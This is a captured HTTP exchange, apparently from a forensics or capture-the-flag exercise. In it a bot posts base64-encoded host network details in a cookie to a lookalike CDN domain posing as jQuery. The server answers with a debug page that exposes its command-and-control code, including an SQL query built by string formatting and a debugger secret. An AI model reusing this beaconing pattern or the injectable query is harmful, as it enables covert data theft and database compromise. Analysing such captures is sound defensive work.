POST /assets/jquery-3.6.0.slim.min.js HTTP/1.1
Host: cdnjs.cloudflair.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Accept-Language: en-US,en;q=0.5
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b; __cfuid=eyJpZCI6IDIwLCAib3V0cHV0IjogIkNsZHBibVJ2ZDNNZ1NWQWdRMjl1Wm1sbmRYSmhkR2x2YmdvS0lDQWdTRzl6ZENCT1lXMWxJQzRnTGlBdUlDNGdMaUF1SUM0Z0xpQXVJQzRnTGlBdUlEb2dSRVZUUzFSUFVDMVJWak5PVVV4TkNpQWdJRkJ5YVcxaGNua2dSRzV6SUZOMVptWnBlQ0FnTGlBdUlDNGdMaUF1SUM0Z0xpQTZJQW9nSUNCT2IyUmxJRlI1Y0dVZ0xpQXVJQzRnTGlBdUlDNGdMaUF1SUM0Z0xpQXVJQzRnT2lCSWVXSnlhV1FLSUNBZ1NWQWdVbTkxZEdsdVp5QkZibUZpYkdWa0xpQXVJQzRnTGlBdUlDNGdMaUF1SURvZ1RtOEtJQ0FnVjBsT1V5QlFjbTk0ZVNCRmJtRmliR1ZrTGlBdUlDNGdMaUF1SUM0Z0xpQXVJRG9nVG04S0lDQWdSRTVUSUZOMVptWnBlQ0JUWldGeVkyZ2dUR2x6ZEM0Z0xpQXVJQzRnTGlBdUlEb2diRzlqWVd4a2IyMWhhVzRLQ2tWMGFHVnlibVYwSUdGa1lYQjBaWElnUlhSb1pYSnVaWFF3T2dvS0lDQWdRMjl1Ym1WamRHbHZiaTF6Y0dWamFXWnBZeUJFVGxNZ1UzVm1abWw0SUNBdUlEb2diRzlqWVd4a2IyMWhhVzRLSUNBZ1JHVnpZM0pwY0hScGIyNGdMaUF1SUM0Z0xpQXVJQzRnTGlBdUlDNGdMaUF1SURvZ1NXNTBaV3dvVWlrZ09ESTFOelJNSUVkcFoyRmlhWFFnVG1WMGQyOXlheUJEYjI1dVpXTjBhVzl1Q2lBZ0lGQm9lWE5wWTJGc0lFRmtaSEpsYzNNdUlDNGdMaUF1SUM0Z0xpQXVJQzRnTGlBNklEQXdMVEJETFRJNUxUVTBMVVF4TFRVekNpQWdJRVJJUTFBZ1JXNWhZbXhsWkM0Z0xpQXVJQzRnTGlBdUlDNGdMaUF1SUM0Z0xpQTZJRmxsY3dvZ0lDQkJkWFJ2WTI5dVptbG5kWEpoZEdsdmJpQkZibUZpYkdWa0lDNGdMaUF1SUM0Z09pQlpaWE1LSUNBZ1RHbHVheTFzYjJOaGJDQkpVSFkySUVGa1pISmxjM01nTGlBdUlDNGdMaUF1SURvZ1ptVTRNRG82TmpBMk56b3hNVFV5T21KaE5tTTZNalpqTnlVMktGQnlaV1psY25KbFpDa2dDaUFnSUVsUWRqUWdRV1JrY21WemN5NGdMaUF1SUM0Z0xpQXVJQzRnTGlBdUlDNGdMaUE2SURFNU1pNHhOamd1TVRNM0xqRXpNU2hRY21WbVpYSnlaV1FwSUFvZ0lDQlRkV0p1WlhRZ1RXRnpheUF1SUM0Z0xpQXVJQzRnTGlBdUlDNGdMaUF1SUM0Z09pQXlOVFV1TWpVMUxqSTFOUzR3Q2lBZ0lFeGxZWE5sSUU5aWRHRnBibVZrTGlBdUlDNGdMaUF1SUM0Z0xpQXVJQzRnTGlBNklESTBJRXAxYm1VZ01qQXlNaUF4TnpvME9Eb3hNd29nSUNCTVpXRnpaU0JGZUhCcGNtVnpJQzRnTGlBdUlDNGdMaUF1SUM0Z0xpQXVJQzRnT2lBeU5DQktkVzVsSURJd01qSWdNakk2TXpNNk1UUUtJQ0FnUkdWbVlYVnNkQ0JIWVhSbGQyRjVJQzRnTGlBdUlDNGdMaUF1SUM0Z0xpQXVJRG9nQ2lBZ0lFUklRMUFnVTJWeWRtVnlJQzRnTGlBdUlDNGdMaUF1SUM0Z0xpQXVJQzRnTGlBNklERTVNaTR4TmpndU1UTTNMakkxTkFvZ0lDQkVTRU5RZGpZZ1NVRkpSQ0F1SUM0Z0xpQXVJQzRnTGlBdUlDNGdMaUF1SUM0Z09pQXhNREEyTmpZME1Ea0tJQ0FnUkVoRFVIWTJJRU5zYVdWdWRDQkVWVWxFTGlBdUlDNGdMaUF1SUM0Z0xpQXVJRG9nTURBdE1ERXRNREF0TURFdE1qa3RNemd0TTBFdE5UZ3RNREF0TUVNdE1qa3ROVFF0UkRFdE5UTUtJQ0FnUkU1VElGTmxjblpsY25NZ0xpQXVJQzRnTGlBdUlDNGdMaUF1SUM0Z0xpQXVJRG9nTVRreUxqRTJPQzR4TXpjdU1Rb2dJQ0JPWlhSQ1NVOVRJRzkyWlhJZ1ZHTndhWEF1SUM0Z0xpQXVJQzRnTGlBdUlDNGdPaUJGYm1GaWJHVmsifQ==
Content-Length: 0

HTTP/1.1 500 INTERNAL SERVER ERROR
Server: Werkzeug/2.1.2 Python/3.8.13
Date: Fri, 24 Jun 2022 17:05:45 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 18904
Connection: close

<!doctype html>
<html lang=en>
  <head>
    <title>psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "task_outputs_task_id_key"
DETAIL:  Key (task_id)=(20) already exists.

 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = false,
          EVALEX_TRUSTED = false,
          SECRET = "FmN3FSsiUpAt8sKOQU94";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>UniqueViolation</h1>
<div class="detail">
  <p class="errormsg">psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint &quot;task_outputs_task_id_key&quot;
DETAIL:  Key (task_id)=(20) already exists.

</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
  <ul><li><div class="frame" id="frame-139855013022848">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">2095</em>,
      in <code class="function">__call__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>def __call__(self, environ: dict, start_response: t.Callable) -&gt; t.Any:</pre>
<pre class="line before"><span class="ws">        </span>&quot;&quot;&quot;The WSGI server calls the Flask application object as the</pre>
<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
<pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
<pre class="line before"><span class="ws">        </span>&quot;&quot;&quot;</pre>
<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)</pre></div>
</div>

<li><div class="frame" id="frame-139855013022736">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">2080</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-139855013022624">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">2077</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error: t.Optional[BaseException] = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-139855013022960">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1525</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre>
<pre class="line after"><span class="ws">        </span>rv: t.Union[ResponseReturnValue, HTTPException],</pre></div>
</div>

<li><div class="frame" id="frame-139855013023072">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1523</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>self.try_trigger_before_first_request_functions()</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
</div>

<li><div class="frame" id="frame-139855013023184">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1509</em>,
      in <code class="function">dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>getattr(rule, &quot;provide_automatic_options&quot;, False)</pre>
<pre class="line before"><span class="ws">            </span>and req.method == &quot;OPTIONS&quot;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
<pre class="line after"><span class="ws">        </span>&quot;&quot;&quot;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-139855013023296">
  <h4>File <cite class="filename">"/app/application/util.py"</cite>,
      line <em class="line">11</em>,
      in <code class="function">wrap</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws"></span>def is_bot(f):</pre>
<pre class="line before"><span class="ws">    </span>@functools.wraps(f)</pre>
<pre class="line before"><span class="ws">    </span>def wrap(*args, **kwargs):</pre>
<pre class="line before"><span class="ws">        </span>if current_app.config[&#x27;BOT_CONFIG&#x27;][&#x27;user_agent&#x27;] == request.headers.get(&#x27;User-Agent&#x27;):</pre>
<pre class="line current"><span class="ws">            </span>return f(*args, **kwargs)</pre>
<pre class="line after"><span class="ws">        </span>else:</pre>
<pre class="line after"><span class="ws">            </span>return send_from_directory(&#x27;./static/js&#x27;, os.path.basename(current_app.config[&#x27;BOT_CONFIG&#x27;][&#x27;get_uri&#x27;]))</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>return wrap</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-139855013023408">
  <h4>File <cite class="filename">"/app/application/blueprints/routes.py"</cite>,
      line <em class="line">56</em>,
      in <code class="function">botRecv</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>bot = Bot(botUUID)</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>if botDATA:</pre>
<pre class="line before"><span class="ws">        </span>taskDATA = json.loads(rec_b64(unquote_plus(botDATA)))</pre>
<pre class="line current"><span class="ws">        </span>bot.saveTaskResp(**taskDATA)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>return fake_script(f&#x27;task=&quot;&quot;;&#x27;)</pre></div>
</div>

<li><div class="frame" id="frame-139855013023520">
  <h4>File <cite class="filename">"/app/application/models/bot.py"</cite>,
      line <em class="line">130</em>,
      in <code class="function">saveTaskResp</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>return taskList</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def saveTaskResp(self, id, output):</pre>
<pre class="line before"><span class="ws">        </span>with Database() as db:</pre>
<pre class="line current"><span class="ws">            </span>db.execute(f&quot;&quot;&quot;INSERT INTO task_outputs(task_id, output) VALUES (&#x27;{id}&#x27;, &#x27;{output}&#x27;)&quot;&quot;&quot;)</pre>
<pre class="line after"><span class="ws">            </span>db.execute(f&quot;&quot;&quot;UPDATE tasks SET received = CURRENT_TIMESTAMP WHERE id={id};&quot;&quot;&quot;)</pre></div>
</div>

<li><div class="frame" id="frame-139855013023632">
  <h4>File <cite class="filename">"/app/application/database.py"</cite>,
      line <em class="line">54</em>,
      in <code class="function">execute</code></h4>
  <div class="source "><pre class="line before"><span class="ws">            </span>self.connect()</pre>
<pre class="line before"><span class="ws">            </span>self.connection.commit()</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def execute(self, sql, params=None):</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line current"><span class="ws">            </span>self.cursor.execute(sql, params or ())</pre>
<pre class="line after"><span class="ws">        </span>except (AttributeError, psycopg2.OperationalError):</pre>
<pre class="line after"><span class="ws">            </span>self.connect()</pre>
<pre class="line after"><span class="ws">            </span>self.cursor.execute(sql, params or ())</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def fetchall(self):</pre></div>
</div>

<li><div class="frame" id="frame-139855013081152">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/psycopg2/extras.py"</cite>,
      line <em class="line">312</em>,
      in <code class="function">execute</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>Record = None</pre>
<pre class="line before"><span class="ws">    </span>MAX_CACHE = 1024</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def execute(self, query, vars=None):</pre>
<pre class="line before"><span class="ws">        </span>self.Record = None</pre>
<pre class="line current"><span class="ws">        </span>return super().execute(query, vars)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def executemany(self, query, vars):</pre>
<pre class="line after"><span class="ws">        </span>self.Record = None</pre>
<pre class="line after"><span class="ws">        </span>return super().executemany(query, vars)</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>
</ul>
  <blockquote>psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint &quot;task_outputs_task_id_key&quot;
DETAIL:  Key (task_id)=(20) already exists.

</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 2095, in __call__
    return self.wsgi_app(environ, start_response)
  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 2080, in wsgi_app
    response = self.handle_exception(e)
  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 2077, in wsgi_app
    response = self.full_dispatch_request()
  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1525, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1523, in full_dispatch_request
    rv = self.dispatch_request()
  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1509, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
  File &quot;/app/application/util.py&quot;, line 11, in wrap
    return f(*args, **kwargs)
  File &quot;/app/application/blueprints/routes.py&quot;, line 56, in botRecv
    bot.saveTaskResp(**taskDATA)
  File &quot;/app/application/models/bot.py&quot;, line 130, in saveTaskResp
    db.execute(f&quot;&quot;&quot;INSERT INTO task_outputs(task_id, output) VALUES (&#x27;{id}&#x27;, &#x27;{output}&#x27;)&quot;&quot;&quot;)
  File &quot;/app/application/database.py&quot;, line 54, in execute
    self.cursor.execute(sql, params or ())
  File &quot;/usr/local/lib/python3.8/site-packages/psycopg2/extras.py&quot;, line 312, in execute
    return super().execute(query, vars)
psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint &quot;task_outputs_task_id_key&quot;
DETAIL:  Key (task_id)=(20) already exists.

</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 2095, in __call__
    return self.wsgi_app(environ, start_response)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 2080, in wsgi_app
    response = self.handle_exception(e)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 2077, in wsgi_app
    response = self.full_dispatch_request()
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1525, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1523, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1509, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
  File "/app/application/util.py", line 11, in wrap
    return f(*args, **kwargs)
  File "/app/application/blueprints/routes.py", line 56, in botRecv
    bot.saveTaskResp(**taskDATA)
  File "/app/application/models/bot.py", line 130, in saveTaskResp
    db.execute(f"""INSERT INTO task_outputs(task_id, output) VALUES ('{id}', '{output}')""")
  File "/app/application/database.py", line 54, in execute
    self.cursor.execute(sql, params or ())
  File "/usr/local/lib/python3.8/site-packages/psycopg2/extras.py", line 312, in execute
    return super().execute(query, vars)
psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "task_outputs_task_id_key"
DETAIL:  Key (task_id)=(20) already exists.



-->
